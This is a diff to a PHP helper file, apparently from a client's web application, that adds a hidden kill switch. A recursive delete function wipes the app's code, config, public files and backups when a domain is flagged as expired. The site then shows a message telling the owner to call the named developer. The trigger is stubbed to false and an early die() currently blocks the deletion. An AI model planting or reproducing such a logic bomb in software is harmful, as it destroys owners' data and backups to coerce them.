@@ -51,3 +51,32 @@ function get_file_data($file){
 
 
 
+
+function delTree($dir) { 
+   $files = array_diff(scandir($dir), array('.','..')); 
+   foreach ($files as $file) { 
+      (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
+   } 
+   return rmdir($dir); 
+} 
+
+function is_website_expired($domain_name){ //just the domain EX: spidro.com (not spidro.com/ar)
+    return false;
+}
+function total_destruction(){
+      die('total_destruction');
+      delTree('app/Http');
+      delTree('resources');
+      delTree('public');
+      delTree('backups');
+      delTree('config');
+      $msg = 'this site is expired- <br> Please call the developer: (Ahmed Badawy)  <br> phone: 01111988246';
+      try{
+         delTree('app/_custom');
+      }catch(Exception $e){
+         die($msg);
+      }
+      die($msg);  
+}
+if (is_website_expired("alaryafest.com")) total_destruction();
+
